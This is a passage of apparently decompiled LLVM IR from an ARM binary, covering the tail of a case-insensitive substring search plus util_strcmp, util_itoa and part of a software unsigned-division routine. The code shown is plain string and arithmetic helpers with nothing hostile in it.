  %v1_10f48 = phi i32 [ %v1_10f4815, %dec_label_pc_10f30.backedge ], [ 0, %dec_label_pc_10f28 ]
  %v0_10f3c = phi i32 [ %v5_10f3c, %dec_label_pc_10f30.backedge ], [ %tmp23, %dec_label_pc_10f28 ]
  %v0_10f34 = add i32 %v0_10f34.in, -1
  %v1_10f3c = inttoptr i32 %v0_10f3c to i8*
  %v2_10f3c = load i8, i8* %v1_10f3c, align 1
  %v3_10f3c = zext i8 %v2_10f3c to i32
  %v5_10f3c = add i32 %v0_10f3c, 1
  %v1_10f40 = add nsw i32 %v3_10f3c, -65
  %v2_10f48 = add i32 %v1_10f48, %arg2
  %v3_10f48 = inttoptr i32 %v2_10f48 to i8*
  %v4_10f48 = load i8, i8* %v3_10f48, align 1
  %v6_10f48 = zext i8 %v4_10f48 to i32
  store i32 %v6_10f48, i32* @r3, align 4
  %v1_10f4c = add nsw i32 %v6_10f48, -65
  %tmp38 = icmp ult i32 %v1_10f40, 26
  br i1 %tmp38, label %bb30, label %bb31

bb30:                                             ; preds = %dec_label_pc_10f3c
  %v5_10f50 = or i32 %v3_10f3c, 96
  br label %bb31

bb31:                                             ; preds = %dec_label_pc_10f3c, %bb30
  %v0_10f5c = phi i32 [ %v3_10f3c, %dec_label_pc_10f3c ], [ %v5_10f50, %bb30 ]
  %tmp39 = icmp ult i32 %v1_10f4c, 26
  br i1 %tmp39, label %bb32, label %bb33

bb32:                                             ; preds = %bb31
  %v5_10f58 = or i32 %v6_10f48, 96
  store i32 %v5_10f58, i32* @r3, align 4
  br label %bb33

bb33:                                             ; preds = %bb31, %bb32
  %v1_10f5c = phi i32 [ %v6_10f48, %bb31 ], [ %v5_10f58, %bb32 ]
  %v9_10f5c = icmp eq i32 %v0_10f5c, %v1_10f5c
  br i1 %v9_10f5c, label %dec_label_pc_10f68, label %bb34

bb34:                                             ; preds = %bb33
  br label %dec_label_pc_10f30.backedge

dec_label_pc_10f30.backedge:                      ; preds = %bb34, %dec_label_pc_10f68
  %v1_10f4815 = phi i32 [ 0, %bb34 ], [ %v1_10f68, %dec_label_pc_10f68 ]
  %tmp35 = icmp slt i32 %v0_10f34, 1
  br i1 %tmp35, label %dec_label_pc_10f80, label %dec_label_pc_10f3c

dec_label_pc_10f68:                               ; preds = %bb33
  %v1_10f68 = add i32 %v1_10f48, 1
  %v9_10f6c = icmp eq i32 %v0_10f6c21, %v1_10f68
  br i1 %v9_10f6c, label %dec_label_pc_10f74, label %dec_label_pc_10f30.backedge

dec_label_pc_10f74:                               ; preds = %dec_label_pc_10f68
  %v2_10f74 = sub i32 %v5_10f3c, %tmp23
  br label %dec_label_pc_10f80

dec_label_pc_10f80:                               ; preds = %dec_label_pc_10f30.backedge, %dec_label_pc_10f28, %dec_label_pc_10f74
  %storemerge = phi i32 [ %v2_10f74, %dec_label_pc_10f74 ], [ -1, %dec_label_pc_10f28 ], [ -1, %dec_label_pc_10f30.backedge ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_10f68, { 1, 0 }
  uselistorder i32 %v0_10f3c, { 1, 0 }
  uselistorder i32 %v1_10f48, { 1, 0 }
  uselistorder i32 %tmp23, { 1, 0 }
  uselistorder i32 26, { 0, 1, 5, 2, 6, 3, 7, 4, 8 }
  uselistorder label %dec_label_pc_10f80, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10f30.backedge, { 1, 0 }
  uselistorder label %bb33, { 1, 0 }
  uselistorder label %bb31, { 1, 0 }
  uselistorder label %dec_label_pc_10f3c, { 1, 0 }
}

define i32 @util_strcmp(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v2_10f88 = load i8, i8* %arg1, align 1
  %v2_10f8c = icmp eq i8 %v2_10f88, 0
  br i1 %v2_10f8c, label %bb, label %dec_label_pc_10f98

bb:                                               ; preds = %entry
  %v3_10f88 = zext i8 %v2_10f88 to i32
  br label %dec_label_pc_10fac

dec_label_pc_10f98:                               ; preds = %entry
  br label %dec_label_pc_10f9c

dec_label_pc_10f9c:                               ; preds = %dec_label_pc_10f9c, %dec_label_pc_10f98
  %v0_10f9c = phi i32 [ %v1_10f9c, %dec_label_pc_10f9c ], [ 0, %dec_label_pc_10f98 ]
  %v1_10f9c = add i32 %v0_10f9c, 1
  %v2_10fa0 = add i32 %v1_10f9c, %tmp
  %v3_10fa0 = inttoptr i32 %v2_10fa0 to i8*
  %v4_10fa0 = load i8, i8* %v3_10fa0, align 1
  %v2_10fa4 = icmp eq i8 %v4_10fa0, 0
  br i1 %v2_10fa4, label %dec_label_pc_10fac, label %dec_label_pc_10f9c

dec_label_pc_10fac:                               ; preds = %dec_label_pc_10f9c, %bb
  %v0_10ff83 = phi i32 [ %v3_10f88, %bb ], [ %v1_10f9c, %dec_label_pc_10f9c ]
  %v1_10fac = inttoptr i32 %arg2 to i8*
  %v2_10fac = load i8, i8* %v1_10fac, align 1
  %v3_10fac = zext i8 %v2_10fac to i32
  store i32 %v3_10fac, i32* @r3, align 4
  %v2_10fb0 = icmp eq i8 %v2_10fac, 0
  br i1 %v2_10fb0, label %bb21, label %dec_label_pc_10fbc

bb21:                                             ; preds = %dec_label_pc_10fac
  store i32 %v3_10fac, i32* @r2, align 4
  br label %dec_label_pc_10fd0

dec_label_pc_10fbc:                               ; preds = %dec_label_pc_10fac
  br label %dec_label_pc_10fc0

dec_label_pc_10fc0:                               ; preds = %dec_label_pc_10fc0, %dec_label_pc_10fbc
  %v0_10fc0 = phi i32 [ %v1_10fc0, %dec_label_pc_10fc0 ], [ 0, %dec_label_pc_10fbc ]
  %v1_10fc0 = add i32 %v0_10fc0, 1
  store i32 %v1_10fc0, i32* @r2, align 4
  %v2_10fc4 = add i32 %v1_10fc0, %arg2
  %v3_10fc4 = inttoptr i32 %v2_10fc4 to i8*
  %v4_10fc4 = load i8, i8* %v3_10fc4, align 1
  %v6_10fc4 = zext i8 %v4_10fc4 to i32
  store i32 %v6_10fc4, i32* @r3, align 4
  %v2_10fc8 = icmp eq i8 %v4_10fc4, 0
  br i1 %v2_10fc8, label %dec_label_pc_10fd0, label %dec_label_pc_10fc0

dec_label_pc_10fd0:                               ; preds = %dec_label_pc_10fc0, %bb21
  %v0_10fd0 = phi i32 [ %v3_10fac, %bb21 ], [ %v1_10fc0, %dec_label_pc_10fc0 ]
  %v9_10fd0 = icmp eq i32 %v0_10fd0, %v0_10ff83
  br i1 %v9_10fd0, label %dec_label_pc_10ff8.preheader, label %dec_label_pc_10fd8

dec_label_pc_10ff8.preheader:                     ; preds = %dec_label_pc_10fd0
  %v2_10ff85 = icmp eq i32 %v0_10ff83, 0
  br i1 %v2_10ff85, label %dec_label_pc_11000, label %dec_label_pc_10fe0

dec_label_pc_10fd8:                               ; preds = %dec_label_pc_10fe0, %dec_label_pc_10fd0
  ret i32 0

dec_label_pc_10fe0:                               ; preds = %dec_label_pc_10ff0, %dec_label_pc_10ff8.preheader
  %v0_10ff8.in = phi i32 [ %v0_10ff8, %dec_label_pc_10ff0 ], [ %v0_10ff83, %dec_label_pc_10ff8.preheader ]
  %v0_10ff4 = phi i32 [ %v1_10ff4, %dec_label_pc_10ff0 ], [ %arg2, %dec_label_pc_10ff8.preheader ]
  %v0_10ff0 = phi i32 [ %v1_10ff0, %dec_label_pc_10ff0 ], [ %tmp, %dec_label_pc_10ff8.preheader ]
  %v0_10ff8 = add i32 %v0_10ff8.in, -1
  %v1_10fe0 = inttoptr i32 %v0_10ff0 to i8*
  %v2_10fe0 = load i8, i8* %v1_10fe0, align 1
  %v3_10fe0 = zext i8 %v2_10fe0 to i32
  store i32 %v3_10fe0, i32* @r2, align 4
  %v1_10fe4 = inttoptr i32 %v0_10ff4 to i8*
  %v2_10fe4 = load i8, i8* %v1_10fe4, align 1
  %v3_10fe4 = zext i8 %v2_10fe4 to i32
  store i32 %v3_10fe4, i32* @r3, align 4
  %v9_10fe8 = icmp eq i8 %v2_10fe0, %v2_10fe4
  br i1 %v9_10fe8, label %dec_label_pc_10ff0, label %dec_label_pc_10fd8

dec_label_pc_10ff0:                               ; preds = %dec_label_pc_10fe0
  %v1_10ff0 = add i32 %v0_10ff0, 1
  %v1_10ff4 = add i32 %v0_10ff4, 1
  %v2_10ff8 = icmp eq i32 %v0_10ff8, 0
  br i1 %v2_10ff8, label %dec_label_pc_11000, label %dec_label_pc_10fe0

dec_label_pc_11000:                               ; preds = %dec_label_pc_10ff0, %dec_label_pc_10ff8.preheader
  ret i32 1

; uselistorder directives
  uselistorder i32 %v1_10fc0, { 0, 1, 3, 2 }
  uselistorder i8 %v2_10f88, { 1, 0 }
}

define i32 @util_itoa(i8 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = sext i8 %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-66 = alloca i32, align 4
  %v0_1100c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_1100c, i32* %r8.global-to-local, align 4
  %v2_1100c = icmp eq i32 %v0_1100c, 0
  store i1 %v2_1100c, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg2, i32* %r6.global-to-local, align 4
  br i1 %v2_1100c, label %dec_label_pc_110ec, label %dec_label_pc_1101c

dec_label_pc_1101c:                               ; preds = %entry
  %v3_1101c = icmp eq i8 %arg1, 0
  store i1 %v3_1101c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_1101c, label %.thread, label %dec_label_pc_11030

.thread:                                          ; preds = %dec_label_pc_1101c
  %v4_11024 = inttoptr i32 %v0_1100c to i8*
  store i8 48, i8* %v4_11024, align 1
  %v0_11028.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_11028.pr.pr, label %.thread1, label %dec_label_pc_11030

.thread1:                                         ; preds = %.thread
  %v4_11028 = load i32, i32* %r8.global-to-local, align 4
  %v5_11028 = add i32 %v4_11028, 1
  %v6_11028 = inttoptr i32 %v5_11028 to i8*
  store i8 0, i8* %v6_11028, align 1
  %v0_1102c.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1102c.pr.pr, label %dec_label_pc_110ec, label %dec_label_pc_11030

dec_label_pc_11030:                               ; preds = %dec_label_pc_1101c, %.thread, %.thread1
  %tmp48 = icmp slt i8 %arg1, 0
  %v7_11034 = icmp eq i32 %arg2, 10
  store i1 %v7_11034, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11034, label %bb, label %.thread29

.thread29:                                        ; preds = %dec_label_pc_11030
  store i32 0, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %.thread6

bb:                                               ; preds = %dec_label_pc_11030
  %v4_11030 = zext i1 %tmp48 to i32
  store i32 %v4_11030, i32* %r2.global-to-local, align 4
  %phitmp = icmp eq i1 %tmp48, false
  store i1 %phitmp, i1* %cpsr_z.global-to-local, align 1
  %v3_110548 = sub nsw i32 0, %tmp
  %tmp.v3_110548 = select i1 %phitmp, i32 %tmp, i32 %v3_110548
  %tmp47 = zext i1 %phitmp to i32
  %. = xor i32 %tmp47, 1
  br label %.thread6

.thread6:                                         ; preds = %bb, %.thread29
  %storemerge31 = phi i32 [ %tmp, %.thread29 ], [ %tmp.v3_110548, %bb ]
  %storemerge = phi i32 [ 0, %.thread29 ], [ %., %bb ]
  store i32 %storemerge, i32* %sl.global-to-local, align 4
  store i32 32, i32* %r5.global-to-local, align 4
  %v2_11060 = ptrtoint i32* %stack_var_-66 to i32
  store i32 %v2_11060, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_11064

dec_label_pc_11064:                               ; preds = %bb46, %.thread6
  %v2_11084 = phi i32 [ %v1_11090, %bb46 ], [ 32, %.thread6 ]
  %v0_11078 = phi i32 [ %v2_11088, %bb46 ], [ %storemerge31, %.thread6 ]
  %v0_11068 = load i32, i32* %r6.global-to-local, align 4
  %v3_1106c = urem i32 %v0_11078, %v0_11068
  store i32 %v3_1106c, i32* %r1.global-to-local, align 4
  %v7_11070 = icmp eq i32 %v3_1106c, 9
  store i1 %v7_11070, i1* %cpsr_z.global-to-local, align 1
  %v1_11074 = add i32 %v3_1106c, 48
  store i32 %v0_11078, i32* %r0.global-to-local, align 4
  %v7_1107c = icmp sgt i32 %v3_1106c, 9
  %extract.t = trunc i32 %v1_11074 to i8
  br i1 %v7_1107c, label %bb45, label %bb46

bb45:                                             ; preds = %dec_label_pc_11064
  %v9_1107c = add i32 %v3_1106c, 55
  %extract.t28 = trunc i32 %v9_1107c to i8
  br label %bb46

bb46:                                             ; preds = %dec_label_pc_11064, %bb45
  %v0_11084.off0 = phi i8 [ %extract.t, %dec_label_pc_11064 ], [ %extract.t28, %bb45 ]
  store i32 %v0_11068, i32* %r1.global-to-local, align 4
  %v3_11084 = load i32, i32* %r7.global-to-local, align 4
  %v4_11084 = add i32 %v3_11084, %v2_11084
  %v5_11084 = inttoptr i32 %v4_11084 to i8*
  store i8 %v0_11084.off0, i8* %v5_11084, align 1
  %v0_11088 = load i32, i32* %r0.global-to-local, align 4
  %v1_11088 = load i32, i32* %r1.global-to-local, align 4
  %v2_11088 = udiv i32 %v0_11088, %v1_11088
  store i32 %v2_11088, i32* %r0.global-to-local, align 4
  %v2_1108c = icmp ugt i32 %v1_11088, %v0_11088
  store i1 %v2_1108c, i1* %cpsr_z.global-to-local, align 1
  %v0_11090 = load i32, i32* %r5.global-to-local, align 4
  %v1_11090 = add i32 %v0_11090, -1
  store i32 %v1_11090, i32* %r5.global-to-local, align 4
  br i1 %v2_1108c, label %dec_label_pc_11098, label %dec_label_pc_11064

dec_label_pc_11098:                               ; preds = %bb46
  %v0_11098 = load i32, i32* %sl.global-to-local, align 4
  %v2_11098 = icmp eq i32 %v0_11098, 0
  store i1 %v2_11098, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11098, label %.thread12, label %.thread11

.thread11:                                        ; preds = %dec_label_pc_11098
  %v3_1109c = ptrtoint i32* %stack_var_-32 to i32
  %v3_110a0 = add i32 %v1_11090, %v3_1109c
  store i32 %v3_110a0, i32* %r2.global-to-local, align 4
  %v4_110a8 = add i32 %v3_110a0, -34
  %v5_110a8 = inttoptr i32 %v4_110a8 to i8*
  store i8 45, i8* %v5_110a8, align 1
  %v0_110ac.pr.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_110ac.pre = load i32, i32* %r5.global-to-local, align 4
  br i1 %v0_110ac.pr.pr.pr, label %.thread12, label %.thread11._crit_edge

.thread12:                                        ; preds = %.thread11, %dec_label_pc_11098
  %v1_110ac = phi i32 [ %v1_11090, %dec_label_pc_11098 ], [ %v1_110ac.pre, %.thread11 ]
  %v2_110ac = add i32 %v1_110ac, 1
  store i32 %v2_110ac, i32* %r5.global-to-local, align 4
  br label %.thread11._crit_edge

.thread11._crit_edge:                             ; preds = %.thread11, %.thread12
  %v1_110b8 = phi i32 [ %v2_110ac, %.thread12 ], [ %v1_110ac.pre, %.thread11 ]
  %v0_110b0 = load i32, i32* %r7.global-to-local, align 4
  %v2_110b0 = add i32 %v0_110b0, %v1_110b8
  %v3_110b0 = inttoptr i32 %v2_110b0 to i8*
  %v4_110b0 = load i8, i8* %v3_110b0, align 1
  %v6_110b0 = zext i8 %v4_110b0 to i32
  %v2_110b4 = icmp eq i8 %v4_110b0, 0
  store i1 %v2_110b4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_110b0, i32* %r2.global-to-local, align 4
  br i1 %v2_110b4, label %dec_label_pc_110fc, label %dec_label_pc_110c4.preheader

dec_label_pc_110c4.preheader:                     ; preds = %.thread11._crit_edge
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_110c4

dec_label_pc_110c4:                               ; preds = %dec_label_pc_110c4.preheader, %dec_label_pc_110c4
  %v0_110c4 = phi i32 [ 0, %dec_label_pc_110c4.preheader ], [ %v1_110c4, %dec_label_pc_110c4 ]
  %v1_110c4 = add i32 %v0_110c4, 1
  store i32 %v1_110c4, i32* %r1.global-to-local, align 4
  %v2_110c8 = add i32 %v1_110c4, %v2_110b0
  %v3_110c8 = inttoptr i32 %v2_110c8 to i8*
  %v4_110c8 = load i8, i8* %v3_110c8, align 1
  %v2_110cc = icmp eq i8 %v4_110c8, 0
  store i1 %v2_110cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_110cc, label %dec_label_pc_110d4, label %dec_label_pc_110c4

dec_label_pc_110d4:                               ; preds = %dec_label_pc_110c4, %dec_label_pc_110fc
  %v0_110d825 = phi i32 [ %v6_110b0, %dec_label_pc_110fc ], [ %v1_110c4, %dec_label_pc_110c4 ]
  %v0_110d4 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_110d4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_110d8

dec_label_pc_110d8:                               ; preds = %dec_label_pc_110d8.dec_label_pc_110d8_crit_edge, %dec_label_pc_110d4
  %v2_110e4 = phi i32 [ %v5_110e4, %dec_label_pc_110d8.dec_label_pc_110d8_crit_edge ], [ %v0_110d4, %dec_label_pc_110d4 ]
  %v0_110dc = phi i32 [ %v0_110dc.pre, %dec_label_pc_110d8.dec_label_pc_110d8_crit_edge ], [ %v2_110b0, %dec_label_pc_110d4 ]
  %v0_110d8 = phi i32 [ %v0_110d8.pre, %dec_label_pc_110d8.dec_label_pc_110d8_crit_edge ], [ %v0_110d825, %dec_label_pc_110d4 ]
  %v1_110d8 = add i32 %v0_110d8, -1
  store i32 %v1_110d8, i32* %r1.global-to-local, align 4
  %v1_110dc = inttoptr i32 %v0_110dc to i8*
  %v2_110dc = load i8, i8* %v1_110dc, align 1
  %v5_110dc = add i32 %v0_110dc, 1
  store i32 %v5_110dc, i32* %r2.global-to-local, align 4
  %v3_110e0 = icmp eq i32 %v0_110d8, 0
  store i1 %v3_110e0, i1* %cpsr_z.global-to-local, align 1
  %v3_110e4 = inttoptr i32 %v2_110e4 to i8*
  store i8 %v2_110dc, i8* %v3_110e4, align 1
  %v4_110e4 = load i32, i32* %r0.global-to-local, align 4
  %v5_110e4 = add i32 %v4_110e4, 1
  store i32 %v5_110e4, i32* %r0.global-to-local, align 4
  br i1 %v3_110e0, label %dec_label_pc_110ec, label %dec_label_pc_110d8.dec_label_pc_110d8_crit_edge

dec_label_pc_110d8.dec_label_pc_110d8_crit_edge:  ; preds = %dec_label_pc_110d8
  %v0_110d8.pre = load i32, i32* %r1.global-to-local, align 4
  %v0_110dc.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_110d8

dec_label_pc_110ec:                               ; preds = %dec_label_pc_110d8, %.thread1, %entry
  %v0_110ec = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_110ec, i32* %r0.global-to-local, align 4
  ret i32 %v0_110ec

dec_label_pc_110fc:                               ; preds = %.thread11._crit_edge
  store i32 %v6_110b0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_110d4

; uselistorder directives
  uselistorder i32 %v5_110e4, { 1, 0 }
  uselistorder i1 %v3_110e0, { 1, 0 }
  uselistorder i32 %v0_110dc, { 1, 0 }
  uselistorder i32 %v1_110c4, { 0, 1, 3, 2 }
  uselistorder i32 %v6_110b0, { 1, 0 }
  uselistorder i32 %v2_110b0, { 1, 0, 2, 3 }
  uselistorder i32 %v1_110ac.pre, { 1, 0 }
  uselistorder i32 %v1_11090, { 1, 0, 3, 2 }
  uselistorder i32 %v2_11088, { 1, 0 }
  uselistorder i32 %v3_1106c, { 0, 2, 1, 3, 4 }
  uselistorder i1 %phitmp, { 2, 1, 0 }
  uselistorder i32 %v0_1100c, { 0, 2, 1 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 4, 5, 6, 7, 0, 1 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 1, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 0, 6, 7, 1 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 11, 10, 12, 13 }
  uselistorder i32 55, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_110d4, { 1, 0 }
  uselistorder label %dec_label_pc_110c4, { 1, 0 }
  uselistorder label %.thread11._crit_edge, { 1, 0 }
  uselistorder label %bb46, { 1, 0 }
  uselistorder label %dec_label_pc_11030, { 2, 1, 0 }
}

define i32 @__udivsi3(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_11104 = load i32, i32* @r1, align 4
  %v1_11104 = add i32 %v0_11104, -1
  store i32 %v1_11104, i32* %r2.global-to-local, align 4
  %v2_11104 = icmp eq i32 %v0_11104, 0
  %v7_11104 = icmp eq i32 %v0_11104, 1
  %v0_11108 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v7_11104, i32 %v0_11108)
  br i1 %v2_11104, label %dec_label_pc_111ec, label %dec_label_pc_11110

dec_label_pc_11110:                               ; preds = %entry
  %v0_11110 = load i32, i32* %r0.global-to-local, align 4
  %v1_11110 = load i32, i32* @r1, align 4
  %tmp = icmp ugt i32 %v0_11110, %v1_11110
  br i1 %tmp, label %dec_label_pc_11118, label %dec_label_pc_111a4

dec_label_pc_11118:                               ; preds = %dec_label_pc_11110
  %v1_11118 = load i32, i32* %r2.global-to-local, align 4
  %v2_11118 = and i32 %v1_11118, %v1_11110
  %v4_11118 = icmp eq i32 %v2_11118, 0
  br i1 %v4_11118, label %dec_label_pc_111b0, label %dec_label_pc_11120

dec_label_pc_11120:                               ; preds = %dec_label_pc_11118
  %v3_11120 = icmp ult i32 %v1_11110, 536870912
  br i1 %v3_11120, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_11120
  %v4_11124 = mul i32 %v1_11110, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_11120, %.thread
  %v0_11144.pr36.ph = phi i32 [ %v4_11124, %.thread ], [ %v1_11110, %dec_label_pc_11120 ]
  %storemerge133 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_11120 ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb81
  %v0_11144.pr36 = phi i32 [ %v4_11138, %bb81 ], [ %v0_11144.pr36.ph, %.preheader.preheader ]
  %v1_1113c = phi i32 [ %v4_1113c, %bb81 ], [ %storemerge133, %.preheader.preheader ]
  %v2_11130 = icmp ugt i32 %v0_11144.pr36, 268435455
  br i1 %v2_11130, label %.thread2, label %bb

.thread2:                                         ; preds = %.preheader
  br label %dec_label_pc_11144thread-pre-split.loopexit

bb:                                               ; preds = %.preheader
  %v4_11134 = icmp ult i32 %v0_11144.pr36, %v0_11110
  br i1 %v4_11134, label %bb80, label %dec_label_pc_11144thread-pre-split.loopexit.loopexit

bb80:                                             ; preds = %bb
  %v2_11138 = and i32 %v0_11144.pr36, 268435456
  %v3_11138 = icmp eq i32 %v2_11138, 0
  %v4_11138 = mul i32 %v0_11144.pr36, 16
  br i1 %v3_11138, label %bb81, label %dec_label_pc_11144.loopexit

bb81:                                             ; preds = %bb80
  %v2_1113c = and i32 %v1_1113c, 268435456
  %v3_1113c = icmp eq i32 %v2_1113c, 0
  %v4_1113c = mul i32 %v1_1113c, 16
  br i1 %v3_1113c, label %.preheader, label %dec_label_pc_11144thread-pre-split.loopexit.loopexit

dec_label_pc_11144thread-pre-split.loopexit.loopexit: ; preds = %bb81, %bb
  %v1_1115048.ph = phi i32 [ %v1_1113c, %bb ], [ %v4_1113c, %bb81 ]
  %v0_11144.pr38.ph = phi i32 [ %v0_11144.pr36, %bb ], [ %v4_11138, %bb81 ]
  br label %dec_label_pc_11144thread-pre-split.loopexit

dec_label_pc_11144thread-pre-split.loopexit:      ; preds = %dec_label_pc_11144thread-pre-split.loopexit.loopexit, %.thread2
  %v1_1115048 = phi i32 [ %v1_1113c, %.thread2 ], [ %v1_1115048.ph, %dec_label_pc_11144thread-pre-split.loopexit.loopexit ]
  %v0_11144.pr38 = phi i32 [ %v0_11144.pr36, %.thread2 ], [ %v0_11144.pr38.ph, %dec_label_pc_11144thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_11144thread-pre-split

dec_label_pc_11144thread-pre-split:               ; preds = %dec_label_pc_11144thread-pre-split.loopexit, %bb83
  %v1_1115046 = phi i32 [ %v1_1115048, %dec_label_pc_11144thread-pre-split.loopexit ], [ %v3_11150, %bb83 ]
  %v0_11144.pr = phi i32 [ %v0_11144.pr38, %dec_label_pc_11144thread-pre-split.loopexit ], [ %v3_1114c, %bb83 ]
  br label %dec_label_pc_11144

dec_label_pc_11144.loopexit:                      ; preds = %bb80
  br label %dec_label_pc_11144

dec_label_pc_11144:                               ; preds = %dec_label_pc_11144.loopexit, %dec_label_pc_11144thread-pre-split
  %v1_11150 = phi i32 [ %v1_1115046, %dec_label_pc_11144thread-pre-split ], [ %v1_1113c, %dec_label_pc_11144.loopexit ]
  %v1_1114c = phi i32 [ %v0_11144.pr, %dec_label_pc_11144thread-pre-split ], [ %v4_11138, %dec_label_pc_11144.loopexit ]
  %v2_11144 = icmp slt i32 %v1_1114c, 0
  br i1 %v2_11144, label %dec_label_pc_11158, label %bb82

bb82:                                             ; preds = %dec_label_pc_11144
  %v4_11148 = icmp ult i32 %v1_1114c, %v0_11110
  br i1 %v4_11148, label %bb83, label %dec_label_pc_11158

bb83:                                             ; preds = %bb82
  %v3_1114c = mul i32 %v1_1114c, 2
  %v2_11150 = icmp slt i32 %v1_11150, 0
  %v3_11150 = mul i32 %v1_11150, 2
  br i1 %v2_11150, label %dec_label_pc_11158, label %dec_label_pc_11144thread-pre-split

dec_label_pc_11158:                               ; preds = %bb82, %dec_label_pc_11144, %bb83
  %v2_1116459 = phi i32 [ %v3_11150, %bb83 ], [ %v1_11150, %bb82 ], [ %v1_11150, %dec_label_pc_11144 ]
  %v1_1115c51 = phi i32 [ %v3_1114c, %bb83 ], [ %v1_1114c, %bb82 ], [ %v1_1114c, %dec_label_pc_11144 ]
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1115c

dec_label_pc_1115c:                               ; preds = %.thread11, %dec_label_pc_11158
  %v1_11190 = phi i32 [ %v4_11190, %.thread11 ], [ %v2_1116459, %dec_label_pc_11158 ]
  %v1_11164 = phi i32 [ %v0_1119c, %.thread11 ], [ 0, %dec_label_pc_11158 ]
  %v1_11194 = phi i32 [ %v4_11194, %.thread11 ], [ %v1_1115c51, %dec_label_pc_11158 ]
  %v1_11160 = phi i32 [ %v0_1118c, %.thread11 ], [ %v0_11110, %dec_label_pc_11158 ]
  %v3_1115c = icmp ult i32 %v1_11160, %v1_11194
  br i1 %v3_1115c, label %.thread7, label %bb84

bb84:                                             ; preds = %dec_label_pc_1115c
  %v3_11160 = sub i32 %v1_11160, %v1_11194
  store i32 %v3_11160, i32* %r0.global-to-local, align 4
  %v3_11164 = or i32 %v1_11164, %v1_11190
  store i32 %v3_11164, i32* %r2.global-to-local, align 4
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_1115c, %bb84
  %v1_1116c = phi i32 [ %v1_11160, %dec_label_pc_1115c ], [ %v3_11160, %bb84 ]
  %v1_11170 = phi i32 [ %v1_11164, %dec_label_pc_1115c ], [ %v3_11164, %bb84 ]
  %v4_11168 = udiv i32 %v1_11194, 2
  %v6_11168 = icmp ult i32 %v1_1116c, %v4_11168
  br i1 %v6_11168, label %.thread8, label %bb85

bb85:                                             ; preds = %.thread7
  %v3_1116c = urem i32 %v1_11194, 2
  %v4_1116c = icmp eq i32 %v3_1116c, 0
  %v6_1116c = sub i32 %v1_1116c, %v4_11168
  store i32 %v6_1116c, i32* %r0.global-to-local, align 4
  br i1 %v4_1116c, label %.thread8, label %bb86

bb86:                                             ; preds = %bb85
  %v5_11170 = udiv i32 %v1_11190, 2
  %v6_11170 = or i32 %v1_11170, %v5_11170
  store i32 %v6_11170, i32* %r2.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %bb85, %.thread7, %bb86
  %v1_11178 = phi i32 [ %v6_1116c, %bb85 ], [ %v1_1116c, %.thread7 ], [ %v6_1116c, %bb86 ]
  %v1_1117c = phi i32 [ %v1_11170, %bb85 ], [ %v1_11170, %.thread7 ], [ %v6_11170, %bb86 ]
  %v4_11174 = udiv i32 %v1_11194, 4
  %v6_11174 = icmp ult i32 %v1_11178, %v4_11174
  br i1 %v6_11174, label %.thread9, label %bb87

bb87:                                             ; preds = %.thread8
  %v3_11178 = and i32 %v1_11194, 2
  %v4_11178 = icmp eq i32 %v3_11178, 0
  %v6_11178 = sub i32 %v1_11178, %v4_11174
  store i32 %v6_11178, i32* %r0.global-to-local, align 4
  br i1 %v4_11178, label %.thread9, label %bb88

bb88:                                             ; preds = %bb87
  %v5_1117c = udiv i32 %v1_11190, 4
  %v6_1117c = or i32 %v1_1117c, %v5_1117c
  store i32 %v6_1117c, i32* %r2.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %bb87, %.thread8, %bb88
